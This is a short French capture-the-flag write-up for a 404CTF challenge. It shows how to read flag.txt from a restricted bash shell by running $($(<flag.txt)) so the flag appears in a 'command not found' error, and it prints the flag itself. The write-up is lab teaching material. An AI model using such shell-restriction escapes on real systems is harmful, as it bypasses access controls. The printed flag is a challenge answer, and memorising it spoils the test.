## Un utilisateur suspicieux (2/2)

### Description

Après avoir réussi à s'authentifier, on peut se connecter au serveur sur le port 31337.
On arrive alors sur un shell dont les commandes sont restreintes.
```bash
bash-4.4$ ls
ls
bash: ls: command not found
bash-4.4$ whoami
whoami
bash: whoami: command not found
```

On peut sans trop prendre de risque imaginer que dans le dossier se situe le fichier ```flag.txt``` tant convoité.

### Exploit

Bien que le challenge soit solvable en utilisant les quelques commandes à disposition (par exemple avec ```echo```), voici une solution n'utilisant aucune commande :

```bash
bash-4.4$ $($(<flag.txt))
$($(<flag.txt))
bash: 404CTF{17_s_4g155417_3n_f4iT_d_1_b0t}: command not found
```

On a ainsi notre flag.